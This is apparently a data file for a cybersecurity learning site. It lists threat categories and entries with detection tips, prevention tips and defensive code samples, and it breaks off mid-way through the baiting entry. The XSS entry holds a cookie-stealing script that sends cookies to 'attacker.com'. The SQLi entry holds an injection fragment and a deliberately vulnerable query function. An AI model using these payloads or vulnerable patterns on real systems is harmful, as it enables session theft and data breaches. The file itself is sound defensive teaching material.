export const categories = [
  {
    slug: "network-security",
    title: "Network Security",
    icon: "◈",
    color: "#6b8cde",
    colorDim: "rgba(107,140,222,0.1)",
    colorBorder: "rgba(107,140,222,0.25)",
    description: "Threats targeting network infrastructure, protocols, and communications.",
    threatCount: 4,
    repoPath: "01-network-security",
  },
  {
    slug: "web-application-security",
    title: "Web Application Security",
    icon: "⬡",
    color: "#f87171",
    colorDim: "rgba(248,113,113,0.1)",
    colorBorder: "rgba(248,113,113,0.25)",
    description: "Vulnerabilities and attacks targeting web applications and APIs.",
    threatCount: 4,
    repoPath: "02-web-application-security",
  },
  {
    slug: "malware-analysis",
    title: "Malware Analysis",
    icon: "⊕",
    color: "#fb923c",
    colorDim: "rgba(251,146,60,0.1)",
    colorBorder: "rgba(251,146,60,0.25)",
    description: "Analysis of malicious software including ransomware, trojans, and rootkits.",
    threatCount: 4,
    repoPath: "03-malware-analysis",
  },
  {
    slug: "social-engineering",
    title: "Social Engineering",
    icon: "◉",
    color: "#a78bfa",
    colorDim: "rgba(167,139,250,0.1)",
    colorBorder: "rgba(167,139,250,0.25)",
    description: "Human-based attacks that exploit psychology and trust.",
    threatCount: 4,
    repoPath: "04-social-engineering",
  },
  {
    slug: "cryptography",
    title: "Cryptography",
    icon: "⬢",
    color: "#4ade80",
    colorDim: "rgba(74,222,128,0.1)",
    colorBorder: "rgba(74,222,128,0.25)",
    description: "Encryption, hashing, digital signatures and key management.",
    threatCount: 4,
    repoPath: "05-cryptography",
  },
  {
    slug: "incident-response",
    title: "Incident Response",
    icon: "◌",
    color: "#22d3ee",
    colorDim: "rgba(34,211,238,0.1)",
    colorBorder: "rgba(34,211,238,0.25)",
    description: "Procedures for detecting, containing, and recovering from security incidents.",
    threatCount: 4,
    repoPath: "06-incident-response",
  },
];

export const threats = [
  // ─── NETWORK SECURITY ──────────────────────────────────────────
  {
    slug: "ddos-attacks",
    category: "network-security",
    title: "DDoS Attacks",
    subtitle: "Distributed Denial of Service",
    severity: "critical",
    description:
      "A Distributed Denial of Service (DDoS) attack floods a target server, network, or service with massive internet traffic from many compromised sources, making it inaccessible to legitimate users.",
    howItWorks: [
      "Attacker builds or rents a botnet — a network of thousands of compromised machines (bots).",
      "A command-and-control (C2) server instructs all bots to simultaneously send traffic to the target.",
      "The volume of requests overwhelms the target's bandwidth, CPU, or memory.",
      "Legitimate users receive timeout errors or connection refusals.",
    ],
    types: [
      { name: "Volumetric", desc: "Floods bandwidth with UDP/ICMP traffic (e.g., UDP Flood, ICMP Flood)." },
      { name: "Protocol", desc: "Exploits network protocol weaknesses (e.g., SYN Flood, Ping of Death)." },
      { name: "Application Layer", desc: "Targets Layer 7 resources like HTTP servers (e.g., HTTP Flood, Slowloris)." },
    ],
    detection: [
      "Monitor traffic volume — sudden spikes from many unique IPs signal an attack.",
      "Analyse packet patterns: repeated requests from same IPs, unusual geographic origins.",
      "Use anomaly-based IDS to flag traffic deviating from baseline.",
      "Set alerts on bandwidth thresholds and connection-per-second rates.",
    ],
    prevention: [
      "Deploy a CDN or DDoS mitigation service (Cloudflare, AWS Shield).",
      "Configure rate limiting at the network edge and web server.",
      "Use Anycast network diffusion to spread traffic across multiple servers.",
      "Implement IP blacklisting and geo-blocking for known malicious ranges.",
      "Maintain an incident response plan specific to DDoS events.",
    ],
    codeExample: `# ddos_detection.py (from the repo)
import time
from collections import defaultdict

THRESHOLD = 1000   # requests per second
WINDOW    = 60     # seconds

request_counts = defaultdict(list)

def detect_ddos(ip: str) -> bool:
    now = time.time()
    # Prune old entries
    request_counts[ip] = [t for t in request_counts[ip] if now - t < WINDOW]
    request_counts[ip].append(now)

    rate = len(request_counts[ip]) / WINDOW
    if rate > THRESHOLD:
        print(f"[ALERT] DDoS detected from {ip}: {rate:.0f} req/s")
        return True
    return False`,
    repoPath: "01-network-security/ddos-attacks",
    tags: ["network", "availability", "botnet"],
  },
  {
    slug: "man-in-the-middle",
    category: "network-security",
    title: "Man-in-the-Middle",
    subtitle: "MITM Interception Attacks",
    severity: "critical",
    description:
      "A MITM attack occurs when an attacker secretly intercepts and potentially alters communications between two parties who believe they are communicating directly.",
    howItWorks: [
      "Attacker positions themselves between two communicating parties (e.g., client and server).",
      "ARP spoofing or DNS poisoning redirects traffic through the attacker's machine.",
      "The attacker reads, modifies, or injects data in real time.",
      "SSL stripping can downgrade HTTPS to HTTP, exposing plaintext credentials.",
    ],
    types: [
      { name: "ARP Spoofing", desc: "Sends fake ARP replies to associate attacker's MAC with victim's IP." },
      { name: "DNS Spoofing", desc: "Returns fraudulent DNS responses, redirecting to malicious servers." },
      { name: "SSL Stripping", desc: "Downgrades HTTPS connections to unencrypted HTTP." },
      { name: "Wi-Fi Eavesdropping", desc: "Creates rogue access points or sniffs unencrypted wireless traffic." },
    ],
    detection: [
      "Monitor ARP tables for duplicate IP-to-MAC mappings.",
      "Use SSL/TLS certificate transparency logs to detect rogue certificates.",
      "Analyse DNS responses for unexpected IP resolutions.",
      "Deploy network intrusion detection systems (NIDS) to flag anomalies.",
    ],
    prevention: [
      "Enforce HTTPS everywhere and implement HSTS with preloading.",
      "Use certificate pinning in mobile and desktop applications.",
      "Enable Dynamic ARP Inspection (DAI) on managed switches.",
      "Utilise VPNs on untrusted networks, especially public Wi-Fi.",
      "Enable MFA to limit impact of intercepted credentials.",
    ],
    codeExample: `# arp_spoof_detector.py (from the repo)
from scapy.all import sniff, ARP
from collections import defaultdict

arp_table = {}

def detect_arp_spoofing(packet):
    if packet.haslayer(ARP) and packet[ARP].op == 2:
        ip  = packet[ARP].psrc
        mac = packet[ARP].hwsrc

        if ip in arp_table and arp_table[ip] != mac:
            print(f"[ALERT] ARP Spoofing detected!")
            print(f"  IP {ip} maps to {arp_table[ip]} but got {mac}")
        else:
            arp_table[ip] = mac

sniff(filter="arp", prn=detect_arp_spoofing, store=0)`,
    repoPath: "01-network-security/man-in-the-middle",
    tags: ["network", "interception", "arp", "ssl"],
  },
  {
    slug: "port-scanning",
    category: "network-security",
    title: "Port Scanning",
    subtitle: "Network Reconnaissance",
    severity: "medium",
    description:
      "Port scanning is a reconnaissance technique used by attackers to discover open ports, services, and potential vulnerabilities on a target system before launching an attack.",
    howItWorks: [
      "Attacker sends packets to a range of ports on a target host.",
      "Based on responses (or lack thereof), open/closed/filtered ports are identified.",
      "Service and version detection reveals what software is running.",
      "Results inform which exploits or attack vectors to attempt.",
    ],
    types: [
      { name: "TCP Connect", desc: "Full three-way handshake — easy to detect, leaves log entries." },
      { name: "SYN (Half-open)", desc: "Sends SYN, never completes handshake — stealthier." },
      { name: "UDP Scan", desc: "Probes UDP ports; slower and less reliable." },
      { name: "Stealth/Idle", desc: "Uses spoofed source IP to scan without revealing attacker's address." },
    ],
    detection: [
      "Log and alert on sequential connection attempts across multiple ports.",
      "Use honeypot ports to attract and identify scanners.",
      "IDS rules to flag SYN flood patterns without completing handshakes.",
      "Monitor for unusually high connection failure rates from a single IP.",
    ],
    prevention: [
      "Close or firewall all unnecessary ports.",
      "Implement port knocking for sensitive services.",
      "Configure firewalls to drop rather than reject unknown packets.",
      "Regularly audit your own attack surface with authorised scans.",
    ],
    codeExample: `# port_scan_detector.py (from the repo)
from collections import defaultdict
import time

scan_threshold = 20   # ports per IP per minute
port_attempts  = defaultdict(list)

def detect_port_scan(src_ip: str, dest_port: int):
    now = time.time()
    port_attempts[src_ip] = [
        (t, p) for (t, p) in port_attempts[src_ip] if now - t < 60
    ]
    port_attempts[src_ip].append((now, dest_port))

    unique_ports = len(set(p for _, p in port_attempts[src_ip]))
    if unique_ports >= scan_threshold:
        print(f"[ALERT] Port scan from {src_ip}: {unique_ports} ports/min")`,
    repoPath: "01-network-security/port-scanning",
    tags: ["network", "reconnaissance"],
  },
  {
    slug: "dns-spoofing",
    category: "network-security",
    title: "DNS Spoofing",
    subtitle: "DNS Cache Poisoning",
    severity: "high",
    description:
      "DNS spoofing (cache poisoning) corrupts a DNS resolver's cache with fraudulent records, redirecting users to malicious websites without their knowledge.",
    howItWorks: [
      "Attacker sends forged DNS responses faster than the legitimate DNS server.",
      "The resolver caches the malicious record for the TTL duration.",
      "All users querying that resolver are redirected to the attacker's IP.",
      "Used to harvest credentials, distribute malware, or conduct phishing.",
    ],
    types: [
      { name: "Cache Poisoning", desc: "Injects false records into a recursive DNS resolver's cache." },
      { name: "DNS Hijacking", desc: "Modifies DNS settings on a router or host directly." },
      { name: "DNS Tunneling", desc: "Encodes data in DNS queries/responses to exfiltrate data." },
    ],
    detection: [
      "Compare DNS responses against multiple trusted resolvers.",
      "Monitor for DNS responses arriving before a query is sent.",
      "Audit DNS cache entries for unexpected IP mappings.",
    ],
    prevention: [
      "Deploy DNSSEC to cryptographically sign DNS records.",
      "Use DNS-over-HTTPS (DoH) or DNS-over-TLS (DoT).",
      "Regularly flush and audit DNS caches.",
      "Use reputable, DNSSEC-validating resolvers.",
    ],
    codeExample: `# dns_verify.py — compare resolver responses
import dns.resolver

def verify_dns(domain: str, trusted_ns="8.8.8.8"):
    r1 = dns.resolver.Resolver()
    r1.nameservers = [trusted_ns]
    r2 = dns.resolver.Resolver()   # system default

    a = {str(x) for x in r1.resolve(domain, 'A')}
    b = {str(x) for x in r2.resolve(domain, 'A')}

    if a != b:
        print(f"[ALERT] DNS mismatch for {domain}")
        print(f"  Trusted: {a}  |  Local: {b}")
    else:
        print(f"[OK] {domain} → {a}")`,
    repoPath: "01-network-security",
    tags: ["network", "dns", "redirection"],
  },

  // ─── WEB APPLICATION SECURITY ───────────────────────────────────
  {
    slug: "sql-injection",
    category: "web-application-security",
    title: "SQL Injection",
    subtitle: "Database Manipulation Attack",
    severity: "critical",
    description:
      "SQL Injection occurs when untrusted data is sent to an interpreter as part of a command or query, allowing attackers to manipulate databases, bypass authentication, and exfiltrate sensitive data.",
    howItWorks: [
      "Attacker identifies an input field that is passed unsanitised to a SQL query.",
      "Malicious SQL fragments are injected (e.g., `' OR '1'='1`).",
      "The database executes the manipulated query as if it were legitimate.",
      "Results can include data leakage, authentication bypass, or database destruction.",
    ],
    types: [
      { name: "Classic (In-band)", desc: "Error-based or union-based; results returned directly in HTTP response." },
      { name: "Blind", desc: "No direct output — attacker infers results via boolean responses or timing." },
      { name: "Out-of-band", desc: "Data exfiltrated via DNS or HTTP requests triggered by the database." },
    ],
    detection: [
      "WAF rules that match SQL keywords in input fields.",
      "Scan application inputs with tools like SQLmap (authorised testing only).",
      "Database audit logs for unexpected queries or data access patterns.",
      "Error monitoring for database exceptions triggered by user input.",
    ],
    prevention: [
      "Always use parameterised queries / prepared statements.",
      "Employ an ORM that abstracts raw SQL.",
      "Validate and sanitise all user input — whitelist expected formats.",
      "Apply least-privilege principles to database accounts.",
      "Deploy a Web Application Firewall (WAF) as a defence-in-depth layer.",
    ],
    codeExample: `# parameterized_queries.py (from the repo)
import sqlite3

# ❌ VULNERABLE
def get_user_vulnerable(username: str):
    conn = sqlite3.connect("users.db")
    query = f"SELECT * FROM users WHERE username = '{username}'"
    return conn.execute(query).fetchone()

# ✅ SAFE — parameterised query
def get_user_safe(username: str):
    conn = sqlite3.connect("users.db")
    query = "SELECT * FROM users WHERE username = ?"
    return conn.execute(query, (username,)).fetchone()

# ✅ SAFE — input validation
import re
def validate_username(username: str) -> bool:
    return bool(re.match(r'^[a-zA-Z0-9_]{3,32}$', username))`,
    repoPath: "02-web-application-security/sql-injection",
    tags: ["web", "database", "injection", "owasp"],
  },
  {
    slug: "xss-attacks",
    category: "web-application-security",
    title: "Cross-Site Scripting (XSS)",
    subtitle: "Client-Side Code Injection",
    severity: "high",
    description:
      "XSS allows attackers to inject malicious scripts into web pages viewed by other users. The browser executes the script in the context of the trusted site, enabling session hijacking, credential theft, and more.",
    howItWorks: [
      "Attacker finds an input or URL parameter that is reflected/stored and rendered in HTML.",
      "Malicious JavaScript is injected (e.g., `<script>document.location='attacker.com?c='+document.cookie</script>`).",
      "Victim's browser executes the script under the trusted domain.",
      "Attacker steals cookies, performs actions on behalf of victim, or defaces the page.",
    ],
    types: [
      { name: "Stored (Persistent)", desc: "Malicious script saved in the database and served to all users." },
      { name: "Reflected", desc: "Script embedded in a URL, executed when victim clicks a malicious link." },
      { name: "DOM-based", desc: "Vulnerability in client-side JS that writes attacker-controlled data to the DOM." },
    ],
    detection: [
      "Security scanners (OWASP ZAP, Burp Suite) for automated XSS detection.",
      "Audit all places where user input is rendered in templates.",
      "Content Security Policy (CSP) violation reports reveal attempted injections.",
    ],
    prevention: [
      "Escape all user-supplied output (HTML, JS, CSS, URL contexts).",
      "Implement a strict Content Security Policy (CSP) header.",
      "Use modern frameworks that auto-escape output (React, Angular).",
      "Set HttpOnly and Secure flags on all session cookies.",
      "Validate and sanitise input on both client and server.",
    ],
    codeExample: `# output_encoding.py (from the repo)
import html, urllib.parse, json

# HTML context
def escape_html(user_input: str) -> str:
    return html.escape(user_input, quote=True)

# JavaScript context
def escape_js(user_input: str) -> str:
    return json.dumps(user_input)   # always JSON-encode JS values

# URL context
def escape_url(user_input: str) -> str:
    return urllib.parse.quote(user_input, safe='')

# CSP header example
CSP = (
    "default-src 'self'; "
    "script-src 'self' 'nonce-{nonce}'; "
    "style-src 'self' 'unsafe-inline'; "
    "img-src 'self' data:; "
    "object-src 'none';"
)`,
    repoPath: "02-web-application-security/xss-attacks",
    tags: ["web", "injection", "javascript", "owasp"],
  },
  {
    slug: "csrf",
    category: "web-application-security",
    title: "CSRF",
    subtitle: "Cross-Site Request Forgery",
    severity: "high",
    description:
      "CSRF tricks an authenticated user's browser into making unintended requests to a web application, exploiting the trust the application has in the user's session.",
    howItWorks: [
      "Victim is logged into a target site (e.g., their bank).",
      "Attacker tricks victim into visiting a malicious page (e.g., via phishing).",
      "Malicious page sends a forged request to the target site using victim's cookies.",
      "The target site processes the request as if it came from the legitimate user.",
    ],
    types: [
      { name: "GET-based", desc: "Uses an <img> or <a> tag to trigger state-changing GET requests." },
      { name: "POST-based", desc: "Hidden form auto-submitted via JavaScript." },
      { name: "JSON-based", desc: "Targets APIs that accept JSON with lax CORS policies." },
    ],
    detection: [
      "Audit all state-changing endpoints for CSRF token validation.",
      "Test with Burp Suite's CSRF PoC generator.",
      "Review CORS policy — overly permissive origins are a red flag.",
    ],
    prevention: [
      "Generate and validate synchronised CSRF tokens for every state-changing request.",
      "Use the SameSite=Strict or SameSite=Lax cookie attribute.",
      "Verify the Origin and Referer headers server-side.",
      "Require re-authentication for sensitive operations.",
    ],
    codeExample: `# csrf_protection.py (from the repo)
import secrets, hmac, hashlib

SECRET_KEY = secrets.token_hex(32)

def generate_csrf_token(session_id: str) -> str:
    token = secrets.token_hex(16)
    sig   = hmac.new(SECRET_KEY.encode(), f"{session_id}:{token}".encode(), hashlib.sha256).hexdigest()
    return f"{token}.{sig}"

def validate_csrf_token(session_id: str, token: str) -> bool:
    try:
        raw, sig = token.split(".")
        expected = hmac.new(SECRET_KEY.encode(), f"{session_id}:{raw}".encode(), hashlib.sha256).hexdigest()
        return hmac.compare_digest(expected, sig)
    except Exception:
        return False`,
    repoPath: "02-web-application-security/csrf",
    tags: ["web", "authentication", "cookies", "owasp"],
  },
  {
    slug: "session-hijacking",
    category: "web-application-security",
    title: "Session Hijacking",
    subtitle: "Cookie & Token Theft",
    severity: "critical",
    description:
      "Session hijacking involves stealing or forging a valid user session token to gain unauthorised access to an application as that user.",
    howItWorks: [
      "Session tokens transmitted over unencrypted HTTP are sniffed by network attackers.",
      "XSS vulnerabilities allow JavaScript to read and exfiltrate `document.cookie`.",
      "Predictable session IDs can be brute-forced or guessed.",
      "The attacker presents the stolen token and the server grants access.",
    ],
    types: [
      { name: "Network Sniffing", desc: "Capturing unencrypted cookies over HTTP." },
      { name: "Cross-site Scripting", desc: "Using XSS to steal cookies via `document.cookie`." },
      { name: "Session Fixation", desc: "Forcing a victim to use a session ID the attacker already knows." },
      { name: "Brute Force", desc: "Guessing weak/sequential session tokens." },
    ],
    detection: [
      "Alert on concurrent sessions from different geographic locations or user agents.",
      "Monitor for sudden changes in IP or device fingerprint mid-session.",
      "Log all authentication events for anomaly analysis.",
    ],
    prevention: [
      "Always serve the application over HTTPS; use HSTS.",
      "Set HttpOnly and Secure flags on session cookies.",
      "Regenerate session IDs after login and privilege escalation.",
      "Implement short session timeouts and absolute expiry.",
      "Bind sessions to IP or user agent as an additional heuristic check.",
    ],
    codeExample: `# session_manager.py
import secrets, hashlib, time

class SessionManager:
    def __init__(self):
        self.sessions = {}

    def create_session(self, user_id: str, ip: str) -> str:
        token = secrets.token_urlsafe(32)
        self.sessions[token] = {
            "user_id": user_id,
            "ip": ip,
            "created": time.time(),
            "last_active": time.time(),
        }
        return token

    def validate(self, token: str, ip: str, max_age=3600) -> bool:
        s = self.sessions.get(token)
        if not s:
            return False
        if time.time() - s["created"] > max_age:
            del self.sessions[token]
            return False
        if s["ip"] != ip:
            print(f"[ALERT] IP mismatch for session {token[:8]}…")
            return False
        s["last_active"] = time.time()
        return True`,
    repoPath: "02-web-application-security",
    tags: ["web", "authentication", "cookies"],
  },

  // ─── MALWARE ANALYSIS ────────────────────────────────────────────
  {
    slug: "ransomware",
    category: "malware-analysis",
    title: "Ransomware",
    subtitle: "Encryption-based Extortion",
    severity: "critical",
    description:
      "Ransomware is malware that encrypts a victim's files and demands payment for the decryption key, crippling individuals and organisations alike.",
    howItWorks: [
      "Delivered via phishing emails, malicious downloads, or RDP exploits.",
      "Establishes persistence and spreads laterally across the network.",
      "Generates an encryption key, encrypts target files, and deletes originals.",
      "Ransom note displayed with payment instructions (usually cryptocurrency).",
    ],
    types: [
      { name: "Crypto Ransomware", desc: "Encrypts files using strong asymmetric cryptography." },
      { name: "Locker Ransomware", desc: "Locks the OS/screen rather than encrypting files." },
      { name: "Double Extortion", desc: "Encrypts AND exfiltrates data, threatening to publish it." },
      { name: "RaaS", desc: "Ransomware-as-a-Service — criminal groups license ransomware to affiliates." },
    ],
    detection: [
      "Monitor file system for rapid mass encryption events.",
      "Detect shadow copy deletion commands (vssadmin, wmic).",
      "Alert on processes writing to high numbers of files in short timeframes.",
      "Honeypot files that trigger alerts when modified.",
    ],
    prevention: [
      "Maintain regular offline/immutable backups following the 3-2-1 rule.",
      "Patch operating systems and software promptly.",
      "Disable macros in Office documents; use application whitelisting.",
      "Segment networks to limit lateral movement.",
      "Train users to recognise phishing and suspicious links.",
    ],
    codeExample: `# ransomware_behavior.py — detection heuristics (from the repo)
import os, time
from collections import defaultdict

THRESHOLD = 50   # files encrypted per minute = suspicious

file_events = defaultdict(list)

def on_file_modified(pid: int, filepath: str):
    now = time.time()
    file_events[pid] = [t for t in file_events[pid] if now - t < 60]
    file_events[pid].append(now)

    if len(file_events[pid]) >= THRESHOLD:
        print(f"[CRITICAL] Possible ransomware: PID {pid} modified "
              f"{len(file_events[pid])} files in 60s")
        # Trigger automated response: kill process, isolate host`,
    repoPath: "03-malware-analysis/ransomware",
    tags: ["malware", "encryption", "extortion"],
  },
  {
    slug: "trojans",
    category: "malware-analysis",
    title: "Trojans",
    subtitle: "Disguised Malicious Software",
    severity: "high",
    description:
      "A Trojan horse masquerades as legitimate software but carries a hidden malicious payload. Unlike viruses, Trojans do not self-replicate — they rely on social engineering to spread.",
    howItWorks: [
      "Bundled inside seemingly legitimate software (games, utilities, cracks).",
      "User installs the application, unknowingly executing the malicious code.",
      "Trojan establishes persistence (registry keys, scheduled tasks, services).",
      "Payload executes: remote access, credential theft, cryptomining, etc.",
    ],
    types: [
      { name: "RAT", desc: "Remote Access Trojan — grants full control to the attacker." },
      { name: "Banker Trojan", desc: "Targets online banking credentials and financial data." },
      { name: "Dropper", desc: "Downloads and installs additional malware payloads." },
      { name: "Backdoor", desc: "Opens a persistent covert channel for command execution." },
    ],
    detection: [
      "Scan with up-to-date antivirus/EDR solutions.",
      "Monitor for unexpected outbound network connections from new processes.",
      "Review startup entries, scheduled tasks, and installed services.",
      "Analyse process trees for unusual parent-child relationships.",
    ],
    prevention: [
      "Download software only from trusted, official sources.",
      "Verify checksums/digital signatures before installing.",
      "Run unknown software in a sandbox or VM first.",
      "Use application whitelisting to block unapproved executables.",
    ],
    codeExample: `# process_analyzer.py (from the repo)
import psutil, socket

KNOWN_GOOD_PORTS = {80, 443, 53, 22, 25}

def scan_suspicious_processes():
    for proc in psutil.process_iter(['pid', 'name', 'connections']):
        try:
            for conn in proc.info['connections'] or []:
                if conn.status == 'ESTABLISHED':
                    rport = conn.raddr.port
                    if rport not in KNOWN_GOOD_PORTS:
                        print(f"[ALERT] {proc.info['name']} "
                              f"(PID {proc.info['pid']}) → "
                              f"{conn.raddr.ip}:{rport}")
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            pass`,
    repoPath: "03-malware-analysis/trojans",
    tags: ["malware", "persistence", "remote-access"],
  },
  {
    slug: "rootkits",
    category: "malware-analysis",
    title: "Rootkits",
    subtitle: "Kernel-Level Stealth Malware",
    severity: "critical",
    description:
      "Rootkits are stealthy malware that gain privileged (root) access to a system and conceal their presence by subverting the OS kernel, making traditional detection extremely difficult.",
    howItWorks: [
      "Installed after initial compromise (via exploit, trojan, or physical access).",
      "Hooks kernel functions to intercept and filter system calls.",
      "Hides its own processes, files, registry entries, and network connections.",
      "Often survives reboots via bootloader or firmware modification.",
    ],
    types: [
      { name: "Kernel Rootkit", desc: "Modifies kernel code or data structures (most dangerous)." },
      { name: "Bootloader", desc: "Infects MBR or UEFI firmware, loads before the OS." },
      { name: "User-mode", desc: "Hooks API calls in user space — easier to detect." },
      { name: "Hypervisor", desc: "Runs the legitimate OS as a VM while controlling hardware." },
    ],
    detection: [
      "Boot from trusted external media and compare file system off-line.",
      "Use kernel integrity checkers (e.g., OSSEC, Tripwire).",
      "Compare in-memory process list with disk-level task lists for discrepancies.",
      "Examine network traffic externally for hidden connections.",
    ],
    prevention: [
      "Enable Secure Boot and UEFI firmware password.",
      "Apply OS and firmware patches promptly.",
      "Use Trusted Platform Module (TPM) for boot integrity.",
      "Limit use of root/administrator accounts; employ least privilege.",
    ],
    codeExample: `# integrity_checker.py (from the repo)
import hashlib, os, json

def hash_file(path: str) -> str:
    sha256 = hashlib.sha256()
    with open(path, 'rb') as f:
        for chunk in iter(lambda: f.read(65536), b''):
            sha256.update(chunk)
    return sha256.hexdigest()

def build_baseline(directory: str, output: str):
    baseline = {}
    for root, _, files in os.walk(directory):
        for fname in files:
            fpath = os.path.join(root, fname)
            try:
                baseline[fpath] = hash_file(fpath)
            except PermissionError:
                pass
    with open(output, 'w') as f:
        json.dump(baseline, f, indent=2)
    print(f"Baseline saved: {len(baseline)} files")

def check_integrity(baseline_file: str):
    with open(baseline_file) as f:
        baseline = json.load(f)
    for path, expected in baseline.items():
        try:
            actual = hash_file(path)
            if actual != expected:
                print(f"[ALERT] Modified: {path}")
        except FileNotFoundError:
            print(f"[ALERT] Deleted: {path}")`,
    repoPath: "03-malware-analysis/rootkits",
    tags: ["malware", "kernel", "stealth"],
  },
  {
    slug: "keyloggers",
    category: "malware-analysis",
    title: "Keyloggers",
    subtitle: "Keystroke Capture Malware",
    severity: "high",
    description:
      "Keyloggers silently record every keystroke made on a device, capturing passwords, credit card numbers, messages, and other sensitive input.",
    howItWorks: [
      "Installed via trojan, phishing, or physical access to the device.",
      "Hooks into keyboard input at the OS or hardware level.",
      "Logs all keystrokes, often with timestamps and active window context.",
      "Periodically exfiltrates captured data to attacker-controlled server.",
    ],
    types: [
      { name: "Software", desc: "Runs as a process or driver; logs via API hooks or kernel drivers." },
      { name: "Hardware", desc: "Physical device inserted between keyboard and PC." },
      { name: "Acoustic", desc: "Analyses sound of keystrokes to infer characters typed." },
      { name: "Browser-based", desc: "Malicious JavaScript capturing form input events." },
    ],
    detection: [
      "Audit running processes and loaded DLLs for unknown hooking libraries.",
      "Network monitoring for periodic beaconing to external hosts.",
      "Anti-keylogger tools that detect and disrupt hook chains.",
    ],
    prevention: [
      "Use a password manager to auto-fill credentials (bypasses keyloggers).",
      "Enable two-factor authentication to limit impact of stolen passwords.",
      "Regularly scan with anti-malware software.",
      "On shared or untrusted systems, use on-screen keyboards for sensitive input.",
    ],
    codeExample: `# keylogger_detector.py — detect suspicious hook activity
import ctypes, sys

# Windows: check for SetWindowsHookEx hooks (educational)
def list_hooks():
    # In a real scenario, enumerate hook chains via WH_KEYBOARD_LL
    print("Scanning for low-level keyboard hooks...")
    # Production: use tools like Sysinternals Process Monitor
    # or check loaded DLLs for known keylogger signatures

# Generic: monitor process for suspicious file writes
import psutil
def check_log_writes(pid: int):
    proc = psutil.Process(pid)
    for f in proc.open_files():
        if any(ext in f.path for ext in ['.log', '.txt', '.dat']):
            print(f"[WARN] PID {pid} writing to: {f.path}")`,
    repoPath: "03-malware-analysis",
    tags: ["malware", "surveillance", "credentials"],
  },

  // ─── SOCIAL ENGINEERING ──────────────────────────────────────────
  {
    slug: "phishing",
    category: "social-engineering",
    title: "Phishing",
    subtitle: "Deceptive Credential Harvesting",
    severity: "critical",
    description:
      "Phishing uses fraudulent communications (usually email) that appear to come from a trusted source to trick victims into revealing sensitive information or installing malware.",
    howItWorks: [
      "Attacker crafts a convincing email impersonating a trusted entity (bank, IT dept, CEO).",
      "Email contains a malicious link to a fake login page or a malware-laden attachment.",
      "Victim enters credentials on the fake page, which are captured by the attacker.",
      "Stolen credentials used for account takeover, lateral movement, or sold.",
    ],
    types: [
      { name: "Spear Phishing", desc: "Highly targeted, personalised attacks on specific individuals." },
      { name: "Whaling", desc: "Targeting C-level executives for high-value access." },
      { name: "Vishing", desc: "Voice-based phishing over the telephone." },
      { name: "Smishing", desc: "SMS-based phishing with malicious links." },
    ],
    detection: [
      "Email authentication: SPF, DKIM, and DMARC records validation.",
      "Scan URLs in emails against known phishing databases (VirusTotal API).",
      "Machine-learning email filters trained on phishing patterns.",
      "User reports of suspicious emails — build a culture of reporting.",
    ],
    prevention: [
      "Deploy email authentication (SPF, DKIM, DMARC) for your domain.",
      "Run regular phishing simulation exercises for all employees.",
      "Enforce MFA — stolen passwords alone won't be enough.",
      "Use a secure email gateway with URL rewriting and attachment sandboxing.",
    ],
    codeExample: `# phishing_detector.py (from the repo)
import re
from urllib.parse import urlparse

SUSPICIOUS_KEYWORDS = ['verify', 'confirm', 'account', 'login', 'secure', 'update']
HOMOGRAPH_CHARS     = {'о': 'o', 'а': 'a', 'е': 'e', 'р': 'p', 'с': 'c'}

def detect_phishing_url(url: str) -> dict:
    parsed  = urlparse(url)
    domain  = parsed.netloc.lower()
    issues  = []

    if not url.startswith('https://'):
        issues.append('No HTTPS')
    if sum(1 for c in domain if c == '.') > 3:
        issues.append('Excessive subdomains')
    if any(k in domain for k in SUSPICIOUS_KEYWORDS):
        issues.append('Suspicious keyword in domain')
    for fake, real in HOMOGRAPH_CHARS.items():
        if fake in domain:
            issues.append(f'Homograph character: {fake} → {real}')

    return {"url": url, "risk": len(issues) > 0, "issues": issues}`,
    repoPath: "04-social-engineering/phishing",
    tags: ["social-engineering", "email", "credentials"],
  },
  {
    slug: "pretexting",
    category: "social-engineering",
    title: "Pretexting",
    subtitle: "Fabricated Scenario Manipulation",
    severity: "high",
    description:
      "Pretexting involves an attacker fabricating a scenario (pretext) to manipulate a victim into providing information or performing actions they wouldn't otherwise do.",
    howItWorks: [
      "Attacker researches the target (LinkedIn, social media, company website).",
      "A believable cover story is created (IT support, auditor, new colleague).",
      "Victim is contacted via phone, email, or in person.",
      "Trust is established before the attacker requests sensitive information or access.",
    ],
    types: [
      { name: "IT Support", desc: "Impersonating help desk to gain credentials or system access." },
      { name: "Vendor/Supplier", desc: "Posing as a known vendor to request payments or data." },
      { name: "Authority Figure", desc: "Impersonating executives, police, or auditors." },
      { name: "Survey/Research", desc: "Fake surveys to gather personal or organisational data." },
    ],
    detection: [
      "Callback verification — always call back on a known number, not one provided by caller.",
      "Unusual urgency or pressure is a red flag.",
      "Requests for credentials or wire transfers outside normal procedures.",
    ],
    prevention: [
      "Establish and enforce clear verification procedures for sensitive requests.",
      "Train staff to identify and report social engineering attempts.",
      "Never share passwords, even with 'IT support'.",
      "Implement a culture of healthy scepticism and verification.",
    ],
    codeExample: `# security_policy.md guidance translated to code:
# social_engineering_detector.py (from the repo)

RED_FLAGS = [
    "urgent request",
    "unusual wire transfer",
    "verify your password",
    "click this link immediately",
    "don't tell anyone",
    "limited time offer",
    "your account will be suspended",
]

def score_message(message: str) -> dict:
    lower   = message.lower()
    matches = [f for f in RED_FLAGS if f in lower]
    risk    = "HIGH" if len(matches) >= 2 else "MEDIUM" if matches else "LOW"
    return {"risk": risk, "flags": matches, "recommendation":
        "Verify via alternative channel" if matches else "Appears normal"}`,
    repoPath: "04-social-engineering/pretexting",
    tags: ["social-engineering", "manipulation", "identity"],
  },
  {
    slug: "baiting",
    category: "social-engineering",
    title: "Baiting",
    subtitle: "Physical & Digital Lure Attacks",
    severity: "medium",
    description:
      "Baiting entices victims with something appealing — a free download, a found USB drive, or a prize — that delivers malware or harvests credentials when the bait is taken.",
    howItWorks: [
      "Attacker leaves infected USB drives in public places (car parks, lobbies).",
      "Or offers free pirated content online that bundles malware.",
      "Victim's curiosity or greed leads them to connect the device or download the file.",
      "Malware executes when device is plugged in or file is opened.",
    ],
    types: [
      { name: "Physical Bait", desc: "Infected USB drives, CDs, or charging cables left in public." },
      { name: "Digital Bait", desc: "Fake free downloads, pirated software, or enticing ads." },
      { name: "Quid Pro Quo", desc: "Promise of benefit (gift card, tech support) in exchange for info." },
    ],
    detection: [
      "Endpoint monitoring for new USB device connections.",
      "Alert on autorun execution from removable media.",
      "Review download patterns for unusually large files from untrusted domains.",
    ],
    prevention: [
      "Disable autorun/autoplay for removable media via Group Policy.",
